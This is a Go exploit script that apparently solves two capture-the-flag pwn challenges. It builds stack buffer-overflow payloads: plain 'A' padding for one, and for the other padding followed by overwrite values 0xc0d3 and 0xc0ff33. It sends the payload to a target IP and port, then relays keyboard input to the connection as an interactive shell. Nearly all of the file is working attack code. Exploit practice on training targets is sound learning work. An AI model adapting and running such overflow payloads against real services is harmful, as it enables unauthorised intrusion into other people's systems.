package main

import (
	"bufio"
	"encoding/binary"
	"fmt"
	"net"
	"os"
	"strings"
)

func pwn101() []byte {
	payload := make([]byte, 61)
	for i := range payload {
		payload[i] = 'A'
	}
	return payload
}

func pwn102() []byte {

	local_C := make([]byte, 4)
	binary.LittleEndian.PutUint32(local_C, 0xc0ff33)

	local_10 := make([]byte, 4)
	binary.LittleEndian.PutUint32(local_10, 0xc0d3)

	payload := make([]byte, 0x68)

	for i := range payload {
		payload[i] = 'A'
	}

	payload = append(payload, local_10...)
	payload = append(payload, local_C...)

	return payload
}
func handleConnection(conn net.Conn) {
	defer conn.Close()

	scanner := bufio.NewScanner(conn)
	for scanner.Scan() {
		data := scanner.Text()
		fmt.Printf("%s\n", data)

		if strings.ToLower(data) == "exit" {
			break
		}
	}
}

func main() {

	ip := os.Args[1]
	port := os.Args[2]
	var payload []byte
	switch port {
	case "9001":
		payload = pwn101()
	case "9002":
		payload = pwn102()
	default:
		fmt.Println("Error, this port is not up to the task.")
		os.Exit(1)
	}

	conn, err := net.Dial("tcp", fmt.Sprintf("%s:%s", ip, port))
	if err != nil {
		fmt.Println("Error connecting to the server:", err)
		os.Exit(1)
	}
	defer conn.Close()

	fmt.Printf("Connected to %s:%s\n", ip, port)

	go handleConnection(conn)

	_, err = conn.Write(payload)

	if err != nil {
		fmt.Println("Error sending payload:", err)
		os.Exit(1)
	}
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		input := scanner.Text()
		if strings.ToLower(input) == "exit" {
			break
		}
		_, err := conn.Write([]byte(input + "\n"))
		if err != nil {
			fmt.Println("Error sending data:", err)
			break
		}
	}
}
